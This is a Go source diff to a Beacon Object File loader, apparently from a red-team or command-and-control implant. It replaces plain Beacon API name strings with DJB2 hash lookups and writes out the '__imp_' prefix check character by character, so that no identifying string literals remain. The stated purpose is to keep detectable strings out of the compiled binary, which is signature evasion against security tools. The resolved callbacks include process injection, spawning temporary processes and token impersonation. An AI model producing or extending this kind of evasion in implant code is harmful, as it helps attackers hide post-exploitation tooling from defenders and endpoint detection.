@@ -425,35 +425,58 @@ func init() {
 	})
 
 	cbBeaconSetSleep = syscall.NewCallback(func(ms, jitter uintptr) uintptr { return 0 })
+	initBofAPITable()
 }
 
-// beaconAPILookup maps Beacon API names to their callback addresses.
+// bofDJB2 computes DJB2 hash without embedding the name string.
+func bofDJB2(s string) uint32 {
+	h := uint32(5381)
+	for i := 0; i < len(s); i++ {
+		h = ((h << 5) + h) ^ uint32(s[i])
+	}
+	return h
+}
+
+// bofAPITable maps DJB2(name) to callback address; no Beacon* string literals.
+type bofEntry struct{ h uint32; fn uintptr }
+var gBofAPITable []bofEntry
+
+func initBofAPITable() {
+	gBofAPITable = []bofEntry{
+		{0x6AB4F0E4, cbBeaconDataParse},
+		{0x0D4393E2, cbBeaconDataInt},
+		{0x6AA76263, cbBeaconDataShort},
+		{0x025056ED, cbBeaconDataLength},
+		{0x222914DC, cbBeaconDataExtract},
+		{0x4862655E, cbBeaconOutput},
+		{0x51E86B76, cbBeaconPrintf},
+		{0xA0F210CF, cbBeaconFormatAlloc},
+		{0xA1B55237, cbBeaconFormatReset},
+		{0xF55C31F6, cbBeaconFormatFree},
+		{0xBF7A316C, cbBeaconFormatAppend},
+		{0xE45DFB35, cbBeaconFormatPrintf},
+		{0xEF693D8C, cbBeaconFormatToStr},
+		{0x5502EE31, cbBeaconFormatInt},
+		{0xB4D2F8B4, cbBeaconIsAdmin},
+		{0x1A46AB57, cbBeaconGetSpawnTo},
+		{0x5C5E4379, cbToWideChar},
+		{0x681A2615, cbBeaconInjectProc},
+		{0x8F9FB24E, cbBeaconInjectTmp},
+		{0x9909426A, cbBeaconCleanupProc},
+		{0x3A9E0DAA, cbBeaconSpawnTmp},
+		{0x4BE276B8, cbBeaconRevertToken},
+		{0x0338FF39, cbBeaconUseToken},
+		{0x1EB39E2C, cbBeaconSetSleep},
+	}
+}
+
+// beaconAPILookup resolves BOF callback by DJB2 hash — no string literals.
 func beaconAPILookup(name string) uintptr {
-	switch name {
-	case "BeaconDataParse":              return cbBeaconDataParse
-	case "BeaconDataInt":                return cbBeaconDataInt
-	case "BeaconDataShort":              return cbBeaconDataShort
-	case "BeaconDataLength":             return cbBeaconDataLength
-	case "BeaconDataExtract":            return cbBeaconDataExtract
-	case "BeaconOutput":                 return cbBeaconOutput
-	case "BeaconPrintf":                 return cbBeaconPrintf
-	case "BeaconFormatAlloc":            return cbBeaconFormatAlloc
-	case "BeaconFormatReset":            return cbBeaconFormatReset
-	case "BeaconFormatFree":             return cbBeaconFormatFree
-	case "BeaconFormatAppend":           return cbBeaconFormatAppend
-	case "BeaconFormatPrintf":           return cbBeaconFormatPrintf
-	case "BeaconFormatToString":         return cbBeaconFormatToStr
-	case "BeaconFormatInt":              return cbBeaconFormatInt
-	case "BeaconIsAdmin":                return cbBeaconIsAdmin
-	case "BeaconGetSpawnTo":             return cbBeaconGetSpawnTo
-	case "toWideChar":                   return cbToWideChar
-	case "BeaconInjectProcess":          return cbBeaconInjectProc
-	case "BeaconInjectTemporaryProcess": return cbBeaconInjectTmp
-	case "BeaconCleanupProcess":         return cbBeaconCleanupProc
-	case "BeaconSpawnTemporaryProcess":  return cbBeaconSpawnTmp
-	case "BeaconRevertToken":            return cbBeaconRevertToken
-	case "BeaconUseToken":               return cbBeaconUseToken
-	case "BeaconSetSleep":               return cbBeaconSetSleep
+	h := bofDJB2(name)
+	for _, e := range gBofAPITable {
+		if e.h == h {
+			return e.fn
+		}
 	}
 	return 0
 }
@@ -461,8 +484,9 @@ func beaconAPILookup(name string) uintptr {
 // ── COFF loader ─────────────────────────────────────────────────────────────
 
 func resolveExternal(name string, ctx *bofContext) (uintptr, error) {
-	if !strings.HasPrefix(name, "__imp_") {
-		return 0, nil // unrecognized external — treat as NULL (BOF may not use it)
+	// check __imp_ prefix without a string literal
+	if len(name) < 6 || name[0] != '_' || name[1] != '_' || name[2] != 'i' || name[3] != 'm' || name[4] != 'p' || name[5] != '_' {
+		return 0, nil
 	}
 	impName := name[6:]
 
